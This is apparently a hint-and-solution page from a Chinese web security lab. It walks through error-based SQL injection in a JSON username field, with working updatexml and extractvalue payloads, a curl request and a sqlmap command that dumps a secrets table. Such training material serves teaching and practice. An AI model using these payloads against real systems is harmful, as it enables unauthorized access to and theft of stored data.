思路提示

本关的注入点在 JSON 请求体的 username 字段里。页面提供了一个 JSON 编辑框，点击「提交查询」会用 XMLHttpRequest 以 Content-Type: application/json 发送。你也可以用 Burp / curl / Postman 直接发原始 JSON。核心思路：单引号闭合 + 报错函数带出数据。

详细解题过程（点击展开）
1. 确认注入点：把 username 改成 admin'，提交后页面出现 MySQL 语法错误，说明单引号未过滤、报错回显开启。
2. 闭合 + 注释：{"username":"admin' -- -"}，不再报错，确认闭合方式为单引号。
3. 报错注入读版本：
{"username":"' or updatexml(1,concat(0x7e,version()),1)-- -"}
报错中出现 MySQL 版本号即证明注入成功。
4. 读通关凭证：
{"username":"' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}
5. extractvalue 备选：
{"username":"' or extractvalue(1,concat(0x7e,(select secret from secrets limit 1)))-- -"}
6. 分段读取（报错约 32 字节截断）：
{"username":"' or updatexml(1,concat(0x7e,substr((select secret from secrets limit 1),1,20)),1)-- -"}
7. curl 命令行验证：
curl -X POST {{SITE}}/modules/sqli/json.php -H "Content-Type: application/json" -d '{"username":"'\'' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}'
8. sqlmap 自动化：
sqlmap -u "{{SITE}}/modules/sqli/json.php" --data '{"username":"admin"}' -p username --technique=E -D bafanglab -T secrets --dump --batch
小提示：JSON 字符串里的双引号要转义成 \"，单引号无需转义；浏览器地址栏里 # 会被当锚点，所以优先用 -- - 注释。
